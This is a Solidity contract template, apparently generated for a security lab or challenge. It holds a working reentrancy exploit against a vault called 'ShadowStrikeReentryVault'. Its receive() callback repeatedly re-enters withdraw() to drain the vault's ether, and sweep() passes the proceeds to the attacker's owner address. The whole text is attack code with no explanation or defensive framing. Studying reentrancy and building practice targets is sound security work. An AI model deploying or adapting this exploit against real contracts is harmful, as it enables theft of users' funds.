    function withdraw() external;
}

contract {{ receiver_type }} {
    IShadowStrikeReentryVault public immutable target;
    address public immutable owner;
    uint256 public immutable MAX_REENTRIES;
    uint256 public reentryCount;

    constructor(address vault, uint256 maxReentries) {
        target = IShadowStrikeReentryVault(vault);
        owner = msg.sender;
        MAX_REENTRIES = maxReentries;
    }

    function attack() external payable {
        require(msg.sender == owner || msg.sender == address(this), "not owner");
        if (msg.value > 0) target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (reentryCount < MAX_REENTRIES && address(target).balance >= msg.value) {
            reentryCount += 1;
            target.withdraw();
        }
    }

    function sweep() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
